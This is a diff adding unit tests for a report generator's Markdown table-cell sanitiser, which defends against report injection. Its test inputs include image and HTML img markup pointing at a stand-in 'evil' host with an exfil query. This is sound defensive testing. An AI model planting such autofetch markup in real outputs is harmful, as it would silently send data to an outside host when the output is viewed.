@@ -341,5 +341,37 @@ class TestBuildFindingsSpec(unittest.TestCase):
         self.assertEqual(len(spec.detail_sections), 0)
 
 
+class TestMdTableCellAutofetch(unittest.TestCase):
+    """Report-injection: finding-derived cell values must not render
+    autofetch markup (same defense the LLM-output sanitiser applies —
+    an `![](url)` in a file path or scanner message otherwise fires
+    an exfil request when the report is opened in a browser)."""
+
+    def test_image_markup_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("pre ![x](http://evil/exfil?q=1) post")
+        self.assertNotIn("![", out)
+        self.assertNotIn("http://evil", out)
+        self.assertIn("[REDACTED-AUTOFETCH-MARKUP]", out)
+
+    def test_html_img_tag_stripped(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell('<img src="http://evil/x">')
+        self.assertNotIn("img", out)
+        self.assertNotIn("http://evil", out)
+
+    def test_legitimate_function_signature_survives(self):
+        from core.reporting.findings import _md_table_cell
+        out = _md_table_cell("check_pw(user, pw) | validate[0]")
+        self.assertIn("check_pw(user, pw)", out)
+        self.assertIn("\\|", out)
+
+    def test_existing_escapes_unchanged(self):
+        from core.reporting.findings import _md_table_cell
+        self.assertEqual(_md_table_cell("a|b"), "a\\|b")
+        self.assertEqual(_md_table_cell("a`b"), "a\\`b")
+        self.assertEqual(_md_table_cell("a\nb"), "a<br>b")
+
+
 if __name__ == "__main__":
     unittest.main()
